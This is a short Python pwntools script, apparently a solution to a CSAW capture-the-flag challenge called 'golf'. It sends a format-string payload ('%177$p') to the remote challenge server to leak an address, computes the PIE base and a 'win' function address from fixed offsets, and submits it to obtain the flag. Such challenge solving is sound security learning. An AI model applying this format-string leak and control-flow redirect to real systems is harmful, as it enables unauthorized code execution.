from pwn import *

#io = process("./golf")
io = remote("golfing.ctf.csaw.io", 9999)

io.sendlineafter(b"name?", b"%177$p")

io.recvuntil(b"hello: ")
main = io.recvline()
main = int(main[:-1], 16)

pie = main - 0x101223
win = pie + 0x101209
win = hex(win)

io.sendlineafter(b"at!:", win[2:])
flag = io.recv()

print(flag)

io.interactive()

